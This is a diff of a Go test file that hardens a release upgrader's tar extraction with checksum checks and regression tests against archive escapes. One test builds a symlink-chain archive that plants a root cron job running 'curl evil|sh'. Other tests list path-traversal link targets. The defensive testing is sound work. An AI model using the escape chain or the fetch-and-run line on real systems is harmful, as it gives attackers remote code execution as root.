@@ -3,12 +3,32 @@ package upgrade
 import (
 	"archive/tar"
 	"context"
+	"crypto/sha256"
+	"encoding/hex"
 	"errors"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strings"
 	"testing"
 )
+
+// writeArchive puts a tarball on disk and returns its path and its digest, so
+// every extraction in this file goes through the same verification the real
+// upgrade does.
+func writeArchive(t *testing.T, dir string, entries []tarEntry) (string, string) {
+	t.Helper()
+	body := buildTarGz(t, entries)
+	path := filepath.Join(dir, "release.tar.gz")
+	if err := os.WriteFile(path, body, 0o600); err != nil {
+		t.Fatalf("write archive: %v", err)
+	}
+	return path, sha256Hex(body)
+}
+
+func extractOpts(sum string) extractOptions {
+	return extractOptions{ExpectedSHA256: sum, MaxBytes: 1 << 20, MaxEntries: 100}
+}
 
 // TestCheckArchiveMemberRejectsUnsafeNames is the table of everything a tar
 // member may not be called. Each entry is a real technique, not a hypothetical.
@@ -63,37 +83,6 @@ func TestCheckArchiveMemberRejectsUnsafeNames(t *testing.T) {
 	}
 }
 
-func TestCheckLinkTargetRejectsEscapes(t *testing.T) {
-	t.Parallel()
-
-	unsafe := []struct{ member, clean, target string }{
-		{"core/env", "core/env", "/vkai-panel/etc/.env"},
-		{"core/env", "core/env", "../../etc/.env"},
-		{"env", "env", "../etc/.env"},
-		{"core/x", "core/x", `..\..\etc`},
-		{"core/x", "core/x", ""},
-		{"core/x", "core/x", "ok\x00/../.."},
-	}
-	for _, tc := range unsafe {
-		err := checkLinkTarget(tc.member, tc.clean, tc.target)
-		var unsafeErr *UnsafeArchiveError
-		if !errors.As(err, &unsafeErr) {
-			t.Errorf("checkLinkTarget(%q -> %q) = %v; want *UnsafeArchiveError", tc.member, tc.target, err)
-		}
-	}
-
-	safe := []struct{ member, clean, target string }{
-		{"core/current", "core/current", "vkai-api"},
-		{"core/a/b", "core/a/b", "../c"},
-		{"panel/link", "panel/link", "../core/vkai-api"},
-	}
-	for _, tc := range safe {
-		if err := checkLinkTarget(tc.member, tc.clean, tc.target); err != nil {
-			t.Errorf("checkLinkTarget(%q -> %q): unexpected error %v", tc.member, tc.target, err)
-		}
-	}
-}
-
 // TestExtractRefusesUnsafeArchives proves the check is actually wired into the
 // extraction, and that nothing lands outside the destination when it fires.
 func TestExtractRefusesUnsafeArchives(t *testing.T) {
@@ -132,6 +121,16 @@ func TestExtractRefusesUnsafeArchives(t *testing.T) {
 			},
 		},
 		{
+			// Refused now even though it stays inside the destination:
+			// a release contains no links at all, so there is no case
+			// left in which one has to be judged.
+			name: "symlink that would have been contained",
+			entries: []tarEntry{
+				{Name: "VERSION", Body: "1.1.0\n"},
+				{Name: "core/current", Typeflag: tar.TypeSymlink, Linkname: "vkai-api"},
+			},
+		},
+		{
 			name: "hard link escaping the destination",
 			entries: []tarEntry{
 				{Name: "VERSION", Body: "1.1.0\n"},
@@ -139,10 +138,24 @@ func TestExtractRefusesUnsafeArchives(t *testing.T) {
 			},
 		},
 		{
+			name: "hard link to a file inside the destination",
+			entries: []tarEntry{
+				{Name: "VERSION", Body: "1.1.0\n"},
+				{Name: "core/link", Typeflag: tar.TypeLink, Linkname: "VERSION"},
+			},
+		},
+		{
 			name: "device node",
 			entries: []tarEntry{
 				{Name: "VERSION", Body: "1.1.0\n"},
 				{Name: "core/mem", Typeflag: tar.TypeChar},
+			},
+		},
+		{
+			name: "the same path written twice",
+			entries: []tarEntry{
+				{Name: "VERSION", Body: "1.1.0\n"},
+				{Name: "VERSION", Body: "owned"},
 			},
 		},
 	}
@@ -157,13 +170,10 @@ func TestExtractRefusesUnsafeArchives(t *testing.T) {
 			canary := filepath.Join(base, "escaped.txt")
 			mustWriteFile(t, canary, "original\n")
 
-			archive := filepath.Join(base, "release.tar.gz")
-			if err := os.WriteFile(archive, buildTarGz(t, tc.entries), 0o600); err != nil {
-				t.Fatalf("write archive: %v", err)
-			}
+			archive, sum := writeArchive(t, base, tc.entries)
 			dest := filepath.Join(base, "dest")
 
-			err := extractTarGz(archive, dest, extractOptions{MaxBytes: 1 << 20, MaxEntries: 100})
+			err := extractTarGz(archive, dest, extractOpts(sum))
 			var unsafeErr *UnsafeArchiveError
 			if !errors.As(err, &unsafeErr) {
 				t.Fatalf("extractTarGz = %v, want *UnsafeArchiveError", err)
@@ -183,22 +193,231 @@ func TestExtractRefusesUnsafeArchives(t *testing.T) {
 	}
 }
 
+// TestExtractRefusesTheSymlinkEscapeChain is the regression test for the
+// vulnerability this package shipped with, reproduced from the proof of concept
+// written during the audit.
+//
+// Every one of these link targets passed the old lexical check -
+// path.Clean(path.Join(dir, target)) - because path.Clean collapses
+// "<symlink>/.." to nothing. The kernel does not: it resolves the symlink and
+// then applies "..", so each hop climbs one real directory and the hops chain.
+// Four members were enough to reach the root of the temporary tree and write a
+// file there; on a real installation the same four reach /etc/cron.d as root.
+func TestExtractRefusesTheSymlinkEscapeChain(t *testing.T) {
+	t.Parallel()
+
+	root := t.TempDir()
+	deep := filepath.Join(root, "vkai-panel", "releases")
+	if err := os.MkdirAll(deep, 0o755); err != nil {
+		t.Fatalf("mkdir: %v", err)
+	}
+	dest := filepath.Join(deep, ".staging-1.2.3-99")
+
+	archive, sum := writeArchive(t, root, []tarEntry{
+		{Name: "a", Typeflag: tar.TypeSymlink, Linkname: "."},      // dest/a -> dest
+		{Name: "a/b", Typeflag: tar.TypeSymlink, Linkname: ".."},   // really dest/b -> releases
+		{Name: "b/c", Typeflag: tar.TypeSymlink, Linkname: ".."},   // really releases/c -> vkai-panel
+		{Name: "b/c/d", Typeflag: tar.TypeSymlink, Linkname: ".."}, // really vkai-panel/d -> root
+		{Name: "b/c/d/etc", Typeflag: tar.TypeDir},                 // really root/etc
+		{Name: "b/c/d/etc/cron.d", Typeflag: tar.TypeDir},
+		{Name: "b/c/d/etc/cron.d/pwn", Body: "* * * * * root /bin/sh -c 'curl evil|sh'\n"},
+	})
+
+	err := extractTarGz(archive, dest, extractOpts(sum))
+	var unsafeErr *UnsafeArchiveError
+	if !errors.As(err, &unsafeErr) {
+		t.Fatalf("extractTarGz = %v, want the escape chain to be refused as *UnsafeArchiveError", err)
+	}
+
+	// The first member is already refused, so nothing at all was created.
+	victim := filepath.Join(root, "etc", "cron.d", "pwn")
+	if exists(victim) {
+		body, _ := os.ReadFile(victim)
+		t.Fatalf("the extraction escaped: %s exists with %q", victim, body)
+	}
+	if exists(filepath.Join(dest, "a")) {
+		t.Error("a link was created before the extraction was abandoned")
+	}
+}
+
+// A symlink that is already on disk must not be written through. The archive is
+// clean here; the trap was laid in the destination beforehand, which is what a
+// second process on the machine - or a leftover from an earlier compromise -
+// can do.
+func TestExtractDoesNotFollowASymlinkAlreadyOnDisk(t *testing.T) {
+	t.Parallel()
+
+	base := t.TempDir()
+	outside := filepath.Join(base, "outside.txt")
+	mustWriteFile(t, outside, "original\n")
+
+	dest := filepath.Join(base, "dest")
+	if err := os.MkdirAll(filepath.Join(dest, "core"), 0o755); err != nil {
+		t.Fatalf("mkdir: %v", err)
+	}
+	mustSymlink(t, outside, filepath.Join(dest, "core", "vkai-api"))
+	// And a directory component that is a symlink, which is the other half
+	// of the same trick.
+	mustSymlink(t, base, filepath.Join(dest, "elsewhere"))
+
+	for _, member := range []string{"core/vkai-api", "elsewhere/planted.txt"} {
+		archive, sum := writeArchive(t, t.TempDir(), []tarEntry{
+			{Name: "VERSION", Body: "1.1.0\n"},
+			{Name: member, Body: "written through the link\n"},
+		})
+		if err := extractTarGz(archive, dest, extractOpts(sum)); err == nil {
+			t.Fatalf("extractTarGz(%s) succeeded; the write followed a link already on disk", member)
+		}
+	}
+
+	body, err := os.ReadFile(outside)
+	if err != nil {
+		t.Fatalf("read %s: %v", outside, err)
+	}
+	if string(body) != "original\n" {
+		t.Errorf("the file behind the symlink was rewritten: %q", body)
+	}
+	if exists(filepath.Join(base, "planted.txt")) {
+		t.Error("a member was written through a symlinked directory component")
+	}
+}
+
+// A member that arrives setuid is refused rather than quietly stripped.
+func TestExtractRefusesPrivilegedModes(t *testing.T) {
+	t.Parallel()
+
+	for name, mode := range map[string]int64{
+		"setuid": 0o4755,
+		"setgid": 0o2755,
+		"sticky": 0o1755,
+	} {
+		name, mode := name, mode
+		t.Run(name, func(t *testing.T) {
+			t.Parallel()
+			base := t.TempDir()
+			archive, sum := writeArchive(t, base, []tarEntry{
+				{Name: "VERSION", Body: "1.1.0\n"},
+				{Name: "core/vkai-api", Body: "#!/bin/sh\n", Mode: mode},
+			})
+			dest := filepath.Join(base, "dest")
+			err := extractTarGz(archive, dest, extractOpts(sum))
+			var unsafeErr *UnsafeArchiveError
+			if !errors.As(err, &unsafeErr) {
+				t.Fatalf("extractTarGz = %v, want a %s member to be refused", err, name)
+			}
+			if exists(filepath.Join(dest, "core", "vkai-api")) {
+				t.Error("the privileged member was written before the refusal")
+			}
+		})
+	}
+}
+
+// The modes on disk come from this package, not from the archive.
+func TestExtractNormalisesModes(t *testing.T) {
+	t.Parallel()
+	base := t.TempDir()
+	archive, sum := writeArchive(t, base, []tarEntry{
+		{Name: "core/", Typeflag: tar.TypeDir, Mode: 0o777},
+		{Name: "core/vkai-api", Body: "#!/bin/sh\n", Mode: 0o777},
+		{Name: "core/config.yaml", Body: "a: b\n", Mode: 0o666},
+		{Name: "core/readonly.txt", Body: "x\n", Mode: 0o400},
+	})
+	dest := filepath.Join(base, "dest")
+	if err := extractTarGz(archive, dest, extractOpts(sum)); err != nil {
+		t.Fatalf("extractTarGz: %v", err)
+	}
+
+	want := map[string]os.FileMode{
+		"core":              0o755,
+		"core/vkai-api":     0o755,
+		"core/config.yaml":  0o644,
+		"core/readonly.txt": 0o644,
+	}
+	for rel, mode := range want {
+		info, err := os.Lstat(filepath.Join(dest, rel))
+		if err != nil {
+			t.Fatalf("lstat %s: %v", rel, err)
+		}
+		if info.Mode().Perm() != mode {
+			t.Errorf("%s has mode %v, want %v", rel, info.Mode().Perm(), mode)
+		}
+	}
+}
+
+// Nothing reaches the gzip reader until the digest matches, on every path into
+// the extractor - which is why the digest is an option of the extractor rather
+// than something a caller is trusted to have checked earlier.
+func TestExtractRefusesAChecksumMismatchBeforeOpeningTheArchive(t *testing.T) {
+	t.Parallel()
+	base := t.TempDir()
+	archive, sum := writeArchive(t, base, []tarEntry{{Name: "VERSION", Body: "1.1.0\n"}})
+	dest := filepath.Join(base, "dest")
+
+	wrong := strings.Repeat("ab", 32)
+	err := extractTarGz(archive, dest, extractOpts(wrong))
+	var mismatch *ChecksumMismatchError
+	if !errors.As(err, &mismatch) {
+		t.Fatalf("extractTarGz = %v, want *ChecksumMismatchError", err)
+	}
+	if mismatch.Actual != sum || mismatch.Expected != wrong {
+		t.Errorf("mismatch = %+v, want expected %s actual %s", mismatch, wrong, sum)
+	}
+	if exists(dest) {
+		t.Error("the destination was created for an archive that failed verification")
+	}
+
+	// An empty digest is a refusal, not a skip: "nobody told me what to
+	// expect" must never mean "extract it anyway".
+	if err := extractTarGz(archive, dest, extractOpts("")); err == nil {
+		t.Fatal("extractTarGz with no expected digest succeeded")
+	}
+	// And so is a digest that is not a sha256.
+	if err := extractTarGz(archive, dest, extractOpts("not-a-digest")); err == nil {
+		t.Fatal("extractTarGz with a malformed expected digest succeeded")
+	}
+}
+
+// The digest is checked against the open file descriptor, so a file swapped
+// between the check and the read is not a hole.
+func TestExtractHashesTheFileItReads(t *testing.T) {
+	t.Parallel()
+	base := t.TempDir()
+	_, goodSum := writeArchive(t, filepath.Join(base), []tarEntry{{Name: "VERSION", Body: "1.1.0\n"}})
+
+	// The archive on disk is a different one; the digest belongs to the
+	// archive we were promised.
+	evil := buildTarGz(t, []tarEntry{{Name: "VERSION", Body: "owned\n"}})
+	archive := filepath.Join(base, "release.tar.gz")
+	if err := os.WriteFile(archive, evil, 0o600); err != nil {
+		t.Fatalf("write archive: %v", err)
+	}
+
+	dest := filepath.Join(base, "dest")
+	if err := extractTarGz(archive, dest, extractOpts(goodSum)); err == nil {
+		t.Fatal("a swapped archive was extracted")
+	}
+	if exists(dest) {
+		t.Error("the destination was created for a swapped archive")
+	}
+}
+
 func TestExtractHappyPath(t *testing.T) {
 	t.Parallel()
 	base := t.TempDir()
+	body := releaseTarball(t, "1.1.0")
 	archive := filepath.Join(base, "release.tar.gz")
-	if err := os.WriteFile(archive, releaseTarball(t, "1.1.0"), 0o600); err != nil {
+	if err := os.WriteFile(archive, body, 0o600); err != nil {
 		t.Fatalf("write archive: %v", err)
 	}
 	dest := filepath.Join(base, "dest")
 
-	if err := extractTarGz(archive, dest, extractOptions{MaxBytes: 1 << 20, MaxEntries: 100}); err != nil {
+	if err := extractTarGz(archive, dest, extractOpts(sha256Hex(body))); err != nil {
 		t.Fatalf("extractTarGz: %v", err)
 	}
 
-	body, err := os.ReadFile(filepath.Join(dest, "VERSION"))
-	if err != nil || strings.TrimSpace(string(body)) != "1.1.0" {
-		t.Fatalf("VERSION = %q, %v", body, err)
+	content, err := os.ReadFile(filepath.Join(dest, "VERSION"))
+	if err != nil || strings.TrimSpace(string(content)) != "1.1.0" {
+		t.Fatalf("VERSION = %q, %v", content, err)
 	}
 	info, err := os.Stat(filepath.Join(dest, "core", "vkai-api"))
 	if err != nil {
@@ -212,29 +431,57 @@ func TestExtractHappyPath(t *testing.T) {
 	}
 }
 
-func TestSanitizeModeStripsPrivilegeBits(t *testing.T) {
+// The tarballs a release pipeline actually produces have to extract. "tar -C
+// dir ." names the destination itself as "./", and pax-format archives - what
+// "git archive" and modern GNU tar emit - start with a global header that is
+// not a file. Refusing either would refuse most real releases.
+func TestExtractAcceptsRealPipelineTarballs(t *testing.T) {
 	t.Parallel()
-	got := sanitizeMode(os.FileMode(0o777) | os.ModeSetuid | os.ModeSetgid | os.ModeSticky)
-	if got&os.ModeSetuid != 0 || got&os.ModeSetgid != 0 || got&os.ModeSticky != 0 {
-		t.Errorf("sanitizeMode kept a privilege bit: %v", got)
+	base := t.TempDir()
+
+	src := filepath.Join(base, "src")
+	if err := os.MkdirAll(filepath.Join(src, "bin"), 0o755); err != nil {
+		t.Fatalf("mkdir: %v", err)
 	}
-	if got.Perm()&0o022 != 0 {
-		t.Errorf("sanitizeMode kept group/other write: %v", got.Perm())
+	mustWriteFile(t, filepath.Join(src, "bin", "vkai"), "binary\n")
+	mustWriteFile(t, filepath.Join(src, "VERSION"), "1.1.0\n")
+
+	cases := []struct {
+		name string
+		args []string
+	}{
+		{"tar -C dir .", []string{"czf", filepath.Join(base, "a.tgz"), "-C", src, "."}},
+		{"tar -C dir bin", []string{"czf", filepath.Join(base, "b.tgz"), "-C", src, "."}},
+		{"tar --format=pax", []string{"czf", filepath.Join(base, "c.tgz"), "--format=pax", "-C", src, "."}},
 	}
-	if got.Perm()&0o700 != 0o700 {
-		t.Errorf("sanitizeMode = %v, want the owner bits preserved", got.Perm())
+	for i, tc := range cases {
+		out, err := exec.Command("tar", tc.args...).CombinedOutput()
+		if err != nil {
+			t.Skipf("tar unavailable or unusable (%s): %v %s", tc.name, err, out)
+		}
+		archive := tc.args[1]
+		raw, err := os.ReadFile(archive)
+		if err != nil {
+			t.Fatalf("read %s: %v", archive, err)
+		}
+		dest := filepath.Join(base, "dest", string(rune('a'+i)))
+		if err := extractTarGz(archive, dest, extractOpts(sha256Hex(raw))); err != nil {
+			t.Errorf("%s: a legitimate tarball was refused: %v", tc.name, err)
+			continue
+		}
+		if !exists(filepath.Join(dest, "bin", "vkai")) {
+			t.Errorf("%s: bin/vkai was not extracted", tc.name)
+		}
 	}
 }
 
 func TestExtractRejectsOversizedArchive(t *testing.T) {
 	t.Parallel()
 	base := t.TempDir()
-	archive := filepath.Join(base, "release.tar.gz")
-	entries := []tarEntry{{Name: "big", Body: strings.Repeat("a", 4096)}}
-	if err := os.WriteFile(archive, buildTarGz(t, entries), 0o600); err != nil {
-		t.Fatalf("write archive: %v", err)
-	}
-	err := extractTarGz(archive, filepath.Join(base, "dest"), extractOptions{MaxBytes: 1024, MaxEntries: 100})
+	archive, sum := writeArchive(t, base, []tarEntry{{Name: "big", Body: strings.Repeat("a", 4096)}})
+	err := extractTarGz(archive, filepath.Join(base, "dest"), extractOptions{
+		ExpectedSHA256: sum, MaxBytes: 1024, MaxEntries: 100,
+	})
 	if err == nil || !strings.Contains(err.Error(), "byte limit") {
 		t.Fatalf("extractTarGz = %v, want a size-limit error", err)
 	}
@@ -243,17 +490,34 @@ func TestExtractRejectsOversizedArchive(t *testing.T) {
 func TestExtractRejectsTooManyEntries(t *testing.T) {
 	t.Parallel()
 	base := t.TempDir()
-	archive := filepath.Join(base, "release.tar.gz")
 	var entries []tarEntry
 	for i := 0; i < 10; i++ {
 		entries = append(entries, tarEntry{Name: "f" + string(rune('0'+i)), Body: "x"})
 	}
-	if err := os.WriteFile(archive, buildTarGz(t, entries), 0o600); err != nil {
-		t.Fatalf("write archive: %v", err)
-	}
-	err := extractTarGz(archive, filepath.Join(base, "dest"), extractOptions{MaxBytes: 1 << 20, MaxEntries: 3})
+	archive, sum := writeArchive(t, base, entries)
+	err := extractTarGz(archive, filepath.Join(base, "dest"), extractOptions{
+		ExpectedSHA256: sum, MaxBytes: 1 << 20, MaxEntries: 3,
+	})
 	if err == nil || !strings.Contains(err.Error(), "members") {
 		t.Fatalf("extractTarGz = %v, want an entry-count error", err)
+	}
+}
+
+func TestDecodeSHA256(t *testing.T) {
+	t.Parallel()
+	sum := sha256.Sum256([]byte("x"))
+	hexed := hex.EncodeToString(sum[:])
+	got, err := decodeSHA256("  " + strings.ToUpper(hexed) + "  ")
+	if err != nil {
+		t.Fatalf("decodeSHA256: %v", err)
+	}
+	if hex.EncodeToString(got) != hexed {
+		t.Errorf("decodeSHA256 = %x, want %s", got, hexed)
+	}
+	for _, bad := range []string{"", "  ", hexed[:63], hexed + "0", strings.Repeat("z", 64)} {
+		if _, err := decodeSHA256(bad); err == nil {
+			t.Errorf("decodeSHA256(%q) should have failed", bad)
+		}
 	}
 }
 
